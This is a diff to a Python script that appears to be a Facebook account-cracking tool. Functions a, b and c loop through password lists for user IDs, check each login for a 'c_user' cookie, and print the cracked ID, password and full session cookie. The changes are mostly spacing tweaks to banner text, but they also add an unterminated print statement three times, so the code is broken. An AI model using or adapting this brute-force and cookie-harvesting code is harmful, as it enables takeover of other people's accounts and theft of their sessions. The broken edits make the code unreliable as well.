@@ -225,6 +225,7 @@ def x():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
+		print('\033[1;32m
 		print('\033[1;32m[\033[1;32m✓] This massage is for my hatters')
 		print('[\033[1;32m✓]      The FIRE Is Back')
 		print('[\033[1;32m✓] Successfully Update Done 3:2.1')
@@ -292,6 +293,7 @@ def virus2():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
+		print('\033[1;32m
 		print('\033[1;32m[\033[1;32m✓] This massage is for my hatters')
 		print('[\033[1;32m✓]      The FIRE Is Back')
 		print('[\033[1;32m✓] Successfully Update Done 3:2.1')
@@ -323,6 +325,7 @@ def virus3():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
+		print('\033[1;32m
 		print('\033[1;32m[\033[1;32m✓] This massage is for my hatters')
 		print('[\033[1;32m✓]      The FIRE Is Back')
 		print('[\033[1;32m✓] Successfully Update Done 3:2.1')
@@ -345,7 +348,7 @@ def a(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93 𝐅𝐈𝐑𝐄 \033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92𝗢𝗞:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93 𝐅𝐈𝐑𝐄 \033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92 𝗢𝗞 :%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -382,7 +385,7 @@ def a(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [𝐅𝐈𝐑𝐄-𝗢𝗞 ] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [ 𝐅𝐈𝐑𝐄-𝗢𝗞 ] '+cid+' | '+ps+'\33[0;92m')
                 
                 print(f'\r\33[1;92m [🔢] Number : {uid}')
                 print(f'\r\033[1;92m [♥] COOKIE : '+coki)
@@ -401,7 +404,7 @@ def a(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[𝐅𝐈𝐑𝐄] \033[1;92m%s\033[m |\033[m[\033[m𝗢𝗞:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.write(f'\r\033[m[ 𝐅𝐈𝐑𝐄 ] \033[1;92m%s\033[m |\033[m[\033[m 𝗢𝗞 :\033[1;92m%s\033[m] '%(loop,len(oks))),
        # sys.stdout.write(f" \r{R} [{B}SAHAN{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
         sys.stdout.flush()
     except:
@@ -414,7 +417,7 @@ def b(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93m𝐅𝐈𝐑𝐄\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92m𝗢𝗞:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93m 𝐅𝐈𝐑𝐄 \033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92m𝗢𝗞:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -451,7 +454,7 @@ def b(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [𝐅𝐈𝐑𝐄-𝗢𝗞 ] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [ 𝐅𝐈𝐑𝐄-𝗢𝗞 ] '+cid+' | '+ps+'\33[0;92m')
                 print(f'\r\33[1;92m [🔢] Number : {uid}')
                 print(f'\r\033[1;92m [♥] COOKIE : '+coki)
                 oks.append(cid)
@@ -470,7 +473,7 @@ def c(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93m𝐅𝐈𝐑𝐄\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92m𝗢𝗞:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93m 𝐅𝐈𝐑𝐄 \033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92m 𝗢𝗞 :%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -507,7 +510,7 @@ def c(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [𝐅𝐈𝐑𝐄-𝗢𝗞 ] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [ 𝐅𝐈𝐑𝐄-𝗢𝗞 ] '+cid+' | '+ps+'\33[0;92m')
                 print(f'\r\33[1;92m [🔢] Numer : {uid}')
                 #print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
                 cek_apk(session,coki)
